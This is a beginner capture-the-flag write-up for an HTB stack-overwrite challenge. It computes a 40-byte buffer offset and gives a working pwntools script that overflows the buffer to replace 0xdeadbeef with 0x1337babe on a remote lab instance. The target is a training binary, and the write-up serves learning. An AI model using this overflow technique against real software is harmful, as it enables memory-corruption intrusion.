# HTB Getting Started - Stack Overwrite

A beginner-friendly intro challenge. Running the binary prints a visualization of the stack and immediately shows what needs to be done:

```
0x00007ffe22529fb0 | 0x0000000000000000 <- Start of buffer
0x00007ffe22529fb8 | 0x0000000000000000
0x00007ffe22529fc0 | 0x0000000000000000
0x00007ffe22529fc8 | 0x0000000000000000
0x00007ffe22529fd0 | 0x6969696969696969 <- Dummy value for alignment
0x00007ffe22529fd8 | 0x00000000deadbeef <- Target to change
0x00007ffe22529fe0 | 0x0000556167fe9800 <- Saved rbp
0x00007ffe22529fe8 | 0x00007fc530cc1c87 <- Saved return address
0x00007ffe22529ff0 | 0x0000000000000001
0x00007ffe22529ff8 | 0x00007ffe2252a0c8
```

## Offset Calculation

The buffer starts at `0x...fb0` and the target is at `0x...fd8`:

```
0xfd8 - 0xfb0 = 0x28 = 40 bytes
```

So we need exactly **40 bytes** of padding to reach `deadbeef`, then overwrite it with the expected value `0x1337babe`.

## Exploit

HTB provides a starter script for this challenge. The only change needed is filling in the payload:

```python
from pwn import *

p = remote('94.237.54.42', 31963)
# p = process('./getting-started')

payload  = b'A' * 40
payload += p32(0x1337babe)

p.sendlineafter(b'>>', payload)
p.interactive()
```

Sending 40 bytes of padding followed by the target value overwrites `deadbeef` → `1337babe` and the binary prints the flag.
